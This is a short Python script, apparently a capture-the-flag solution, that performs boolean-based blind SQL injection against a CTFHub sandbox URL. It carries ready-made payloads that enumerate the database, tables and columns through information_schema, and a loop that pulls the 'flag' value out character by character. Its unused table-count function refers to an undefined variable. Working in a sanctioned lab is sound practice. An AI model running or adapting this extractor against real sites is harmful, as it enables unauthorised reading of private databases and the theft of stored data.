import requests
url='http://challenge-7fb62f66a006963e.sandbox.ctfhub.com:10800/?id=1 and '
db='ascii(substr((select database()),%d,1))=%d'
table_name = "ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d"
column_name = "ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),%d,1))=%d"
data='ascii(substr((select flag from flag),%d,1))=%d'

def get_table_count():
    for i in range(1,10):
        table_payload=table_count%(i)
        r=requests.get(url+table_payload)
        print(r.url)
        if 'query_success' in r.text:
            print("表的数量: "+str(i))
            return i
def get_data():
    response=''
    for i in range(1,10):
        for j in range(31,128):
            payload=data%(i,j)
            r=requests.get(url+payload)
            print(r.url)
            if 'query_success' in r.text:
                response+=chr(j)
                print(f"结果: {response}")
                break
            if j==127:
                print('不需要再查询了或者布尔注入失败了')
                print('结果为: '+response)
                return
    print('结果为: '+response)
if __name__=='__main__':
    get_data()

